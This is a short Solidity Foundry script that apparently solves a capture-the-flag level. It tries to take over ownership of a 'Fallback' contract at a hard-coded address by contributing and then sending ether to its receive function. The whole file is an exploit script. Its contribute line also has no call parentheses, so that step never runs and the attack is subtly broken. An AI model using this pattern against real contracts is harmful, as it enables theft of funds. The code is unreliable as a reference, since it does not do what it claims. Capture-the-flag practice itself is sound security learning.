// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

    Fallback public fallbackInstance = Fallback(payable(0xD9cb468f14f0127370b2F7cFA538E9D7a4c809de));

    function run() external {
 
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      fallbackInstance.contribute{value: 1 wei};
      address(fallbackInstance).call{value: 1 wei}("");
      console.log("New Owner: ", fallbackInstance.owner());
      console.log("My Address", vm.envAddress("MY_ADDRESS"));
      vm.stopBroadcast();
    }

}